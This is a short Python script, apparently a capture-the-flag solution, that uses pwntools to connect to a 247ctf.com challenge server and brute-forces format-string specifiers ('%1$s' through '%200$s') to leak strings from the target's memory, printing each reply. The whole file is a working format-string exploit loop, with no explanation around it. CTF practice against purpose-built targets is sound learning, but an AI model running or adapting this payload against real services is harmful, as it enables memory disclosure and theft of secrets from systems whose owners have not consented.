from pwn import *
context.log_level = 'error'

for i in range(1, 201):
    try:
        p = remote('70719353762d0de6.247ctf.com', 50357)
        p.sendlineafter('?\n', "%{}$s".format(i).encode())

        p.recvuntil('Welcome back ')
        resp = p.recvline().strip(b'\n').decode('latin1')
        
        print(str(i) + ': ' + resp)

        p.close()

    except EOFError:
        pass
